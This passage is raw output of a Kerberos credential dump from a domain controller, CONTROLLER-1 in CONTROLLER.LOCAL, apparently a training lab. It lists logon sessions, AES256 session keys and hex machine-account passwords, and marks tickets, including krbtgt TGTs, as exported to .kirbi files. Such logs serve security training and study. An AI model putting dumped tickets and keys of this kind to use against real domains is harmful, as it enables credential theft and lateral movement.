           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c34526c20d7950d9df60bb7f9679deff266d292444c2e9da1a914e89c1282d30
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;611b0]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 397535 (00000000:000610df)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:18:59 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c34526c20d7950d9df60bb7f9679deff266d292444c2e9da1a914e89c1282d30
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;610df]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 220924 (00000000:00035efc)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:14:18 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c34526c20d7950d9df60bb7f9679deff266d292444c2e9da1a914e89c1282d30
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;35efc]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60274 (00000000:0000eb72)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:41 PM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 20 9a f4 ba b9 50 fa 0c 0c d5 8b e8 29 6d 38 89 0f 1b 34 87 b4 f4 b7 97 c1 e6 a3 2c c5 14 08 b1 80 4b dd 0d 8f fc 92 59 a7 da 04 73 eb 2c c4 49 5d 5a d4 00 b0 dc 59 74 dd b8 9c 7b 29 2b a6 f9 d5 2e a4 c1 5a 92 5d 82 8e c6 31 07 37 f9 b9 c7 56 36 cd bc 78 16 8d 59 0c c1 79 2f d3 20 38 c5 cc 15 bf 4e 4c 81 e6 db 9b 72 0b f4 df 60 e9 f2 b1 e5 f5 b7 27 56 ad 0c e5 81 08 62 a9 c5 a0 4d 4c ef 07 77 e1 42 ab 2a 6c d1 bc 44 08 28 55 fb d7 92 42 0b dc 0f 04 c3 d8 26 53 42 6d 9c 30 2f 87 5e 30 92 8c 5d 5a a0 83 00 1b cf db 60 1c f0 cf ba 38 8a 87 b2 49 27 de d4 50 1d b7 af 55 50 01 dc ea 64 8c 26 c6 03 dd 5e a1 02 ff 2a eb 56 91 35 a7 3b 78 f5 c1 76 44 b6 2f 42 06 a9 df e0 1d 97 7b 62 bf 8b c0 d2 30 fd 99 78 b7 c2 57 fe

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:39 PM
SID               : S-1-5-20

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:43:43 PM ; 9/22/2021 3:43:43 AM ; 9/28/2021 5:43:43 PM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             1baccf8024c312bf399f9ed24ebbdf649945810ce175f251185d9aa2d3ce5593
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:43:43 PM ; 9/22/2021 3:43:43 AM ; 9/28/2021 5:43:43 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             818ebdbb412ff9d7adba8ff02278f97ae11d021c8bba27cacefe3cd81186de56
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 32867 (00000000:00008063)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:38 PM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 20 9a f4 ba b9 50 fa 0c 0c d5 8b e8 29 6d 38 89 0f 1b 34 87 b4 f4 b7 97 c1 e6 a3 2c c5 14 08 b1 80 4b dd 0d 8f fc 92 59 a7 da 04 73 eb 2c c4 49 5d 5a d4 00 b0 dc 59 74 dd b8 9c 7b 29 2b a6 f9 d5 2e a4 c1 5a 92 5d 82 8e c6 31 07 37 f9 b9 c7 56 36 cd bc 78 16 8d 59 0c c1 79 2f d3 20 38 c5 cc 15 bf 4e 4c 81 e6 db 9b 72 0b f4 df 60 e9 f2 b1 e5 f5 b7 27 56 ad 0c e5 81 08 62 a9 c5 a0 4d 4c ef 07 77 e1 42 ab 2a 6c d1 bc 44 08 28 55 fb d7 92 42 0b dc 0f 04 c3 d8 26 53 42 6d 9c 30 2f 87 5e 30 92 8c 5d 5a a0 83 00 1b cf db 60 1c f0 cf ba 38 8a 87 b2 49 27 de d4 50 1d b7 af 55 50 01 dc ea 64 8c 26 c6 03 dd 5e a1 02 ff 2a eb 56 91 35 a7 3b 78 f5 c1 76 44 b6 2f 42 06 a9 df e0 1d 97 7b 62 bf 8b c0 d2 30 fd 99 78 b7 c2 57 fe

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32789 (00000000:00008015)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:38 PM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 2840336 (00000000:002b5710)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/21/2021 5:49:35 PM
SID               : S-1-5-90-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 20 9a f4 ba b9 50 fa 0c 0c d5 8b e8 29 6d 38 89 0f 1b 34 87 b4 f4 b7 97 c1 e6 a3 2c c5 14 08 b1 80 4b dd 0d 8f fc 92 59 a7 da 04 73 eb 2c c4 49 5d 5a d4 00 b0 dc 59 74 dd b8 9c 7b 29 2b a6 f9 d5 2e a4 c1 5a 92 5d 82 8e c6 31 07 37 f9 b9 c7 56 36 cd bc 78 16 8d 59 0c c1 79 2f d3 20 38 c5 cc 15 bf 4e 4c 81 e6 db 9b 72 0b f4 df 60 e9 f2 b1 e5 f5 b7 27 56 ad 0c e5 81 08 62 a9 c5 a0 4d 4c ef 07 77 e1 42 ab 2a 6c d1 bc 44 08 28 55 fb d7 92 42 0b dc 0f 04 c3 d8 26 53 42 6d 9c 30 2f 87 5e 30 92 8c 5d 5a a0 83 00 1b cf db 60 1c f0 cf ba 38 8a 87 b2 49 27 de d4 50 1d b7 af 55 50 01 dc ea 64 8c 26 c6 03 dd 5e a1 02 ff 2a eb 56 91 35 a7 3b 78 f5 c1 76 44 b6 2f 42 06 a9 df e0 1d 97 7b 62 bf 8b c0 d2 30 fd 99 78 b7 c2 57 fe

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 2838808 (00000000:002b5118)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/21/2021 5:49:34 PM
SID               : S-1-5-96-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 20 9a f4 ba b9 50 fa 0c 0c d5 8b e8 29 6d 38 89 0f 1b 34 87 b4 f4 b7 97 c1 e6 a3 2c c5 14 08 b1 80 4b dd 0d 8f fc 92 59 a7 da 04 73 eb 2c c4 49 5d 5a d4 00 b0 dc 59 74 dd b8 9c 7b 29 2b a6 f9 d5 2e a4 c1 5a 92 5d 82 8e c6 31 07 37 f9 b9 c7 56 36 cd bc 78 16 8d 59 0c c1 79 2f d3 20 38 c5 cc 15 bf 4e 4c 81 e6 db 9b 72 0b f4 df 60 e9 f2 b1 e5 f5 b7 27 56 ad 0c e5 81 08 62 a9 c5 a0 4d 4c ef 07 77 e1 42 ab 2a 6c d1 bc 44 08 28 55 fb d7 92 42 0b dc 0f 04 c3 d8 26 53 42 6d 9c 30 2f 87 5e 30 92 8c 5d 5a a0 83 00 1b cf db 60 1c f0 cf ba 38 8a 87 b2 49 27 de d4 50 1d b7 af 55 50 01 dc ea 64 8c 26 c6 03 dd 5e a1 02 ff 2a eb 56 91 35 a7 3b 78 f5 c1 76 44 b6 2f 42 06 a9 df e0 1d 97 7b 62 bf 8b c0 d2 30 fd 99 78 b7 c2 57 fe

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 2838743 (00000000:002b50d7)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/21/2021 5:49:34 PM
SID               : S-1-5-96-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 20 9a f4 ba b9 50 fa 0c 0c d5 8b e8 29 6d 38 89 0f 1b 34 87 b4 f4 b7 97 c1 e6 a3 2c c5 14 08 b1 80 4b dd 0d 8f fc 92 59 a7 da 04 73 eb 2c c4 49 5d 5a d4 00 b0 dc 59 74 dd b8 9c 7b 29 2b a6 f9 d5 2e a4 c1 5a 92 5d 82 8e c6 31 07 37 f9 b9 c7 56 36 cd bc 78 16 8d 59 0c c1 79 2f d3 20 38 c5 cc 15 bf 4e 4c 81 e6 db 9b 72 0b f4 df 60 e9 f2 b1 e5 f5 b7 27 56 ad 0c e5 81 08 62 a9 c5 a0 4d 4c ef 07 77 e1 42 ab 2a 6c d1 bc 44 08 28 55 fb d7 92 42 0b dc 0f 04 c3 d8 26 53 42 6d 9c 30 2f 87 5e 30 92 8c 5d 5a a0 83 00 1b cf db 60 1c f0 cf ba 38 8a 87 b2 49 27 de d4 50 1d b7 af 55 50 01 dc ea 64 8c 26 c6 03 dd 5e a1 02 ff 2a eb 56 91 35 a7 3b 78 f5 c1 76 44 b6 2f 42 06 a9 df e0 1d 97 7b 62 bf 8b c0 d2 30 fd 99 78 b7 c2 57 fe

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 2684351 (00000000:0028f5bf)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:45:21 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0eeca421831319001d9c12ea7747b38a8d7874162f650a6f92117b23399f3d68
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;28f5bf]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 397687 (00000000:00061177)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:18:59 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:25 PM ; 9/22/2021 3:14:18 AM ;
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             8c54b82db2eee66e5b69ef14f67b89deefef16c93b4380844bba010db7afa9a8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;61177]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 397627 (00000000:0006113b)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:18:59 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c34526c20d7950d9df60bb7f9679deff266d292444c2e9da1a914e89c1282d30
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;6113b]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 221980 (00000000:0003631c)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:14:18 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0eeca421831319001d9c12ea7747b38a8d7874162f650a6f92117b23399f3d68
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3631c]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:41 PM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60293 (00000000:0000eb85)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:41 PM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32894 (00000000:0000807e)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:38 PM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32693 (00000000:00007fb5)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:38 PM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 20 9a f4 ba b9 50 fa 0c 0c d5 8b e8 29 6d 38 89 0f 1b 34 87 b4 f4 b7 97 c1 e6 a3 2c c5 14 08 b1 80 4b dd 0d 8f fc 92 59 a7 da 04 73 eb 2c c4 49 5d 5a d4 00 b0 dc 59 74 dd b8 9c 7b 29 2b a6 f9 d5 2e a4 c1 5a 92 5d 82 8e c6 31 07 37 f9 b9 c7 56 36 cd bc 78 16 8d 59 0c c1 79 2f d3 20 38 c5 cc 15 bf 4e 4c 81 e6 db 9b 72 0b f4 df 60 e9 f2 b1 e5 f5 b7 27 56 ad 0c e5 81 08 62 a9 c5 a0 4d 4c ef 07 77 e1 42 ab 2a 6c d1 bc 44 08 28 55 fb d7 92 42 0b dc 0f 04 c3 d8 26 53 42 6d 9c 30 2f 87 5e 30 92 8c 5d 5a a0 83 00 1b cf db 60 1c f0 cf ba 38 8a 87 b2 49 27 de d4 50 1d b7 af 55 50 01 dc ea 64 8c 26 c6 03 dd 5e a1 02 ff 2a eb 56 91 35 a7 3b 78 f5 c1 76 44 b6 2f 42 06 a9 df e0 1d 97 7b 62 bf 8b c0 d2 30 fd 99 78 b7 c2 57 fe

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:13:29 PM
SID               : S-1-5-18

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:45:21 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             db82ff2f1b4676871b59458e198f04130ce85b786fceca665f8e35208a814339
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 9/21/2021 5:28:48 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             10a588f028389fafd9c1a7a1a7aa6a04772edf0a30ebf11388ba3f2cf631dff8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000002]
           Start/End/MaxRenew: 9/21/2021 5:23:32 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             52d53a15904510ed6957de9f1afa2182b68595159132e45ef35a2567e82bb059
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi !
         [00000003]
           Start/End/MaxRenew: 9/21/2021 5:14:43 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Target Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             eb1e2e0e14f3cb568ce73a74866b06ee3c20c0cb63c068aa05c7b7b022cea3fb
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-3-40a50000.kirbi !
         [00000004]
           Start/End/MaxRenew: 9/21/2021 5:14:43 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             e4ad000d879e4342f8d0d2a9d107fc12765373d50d76614a7eb8fb0cf71d3b99
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000005]
           Start/End/MaxRenew: 9/21/2021 5:14:25 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
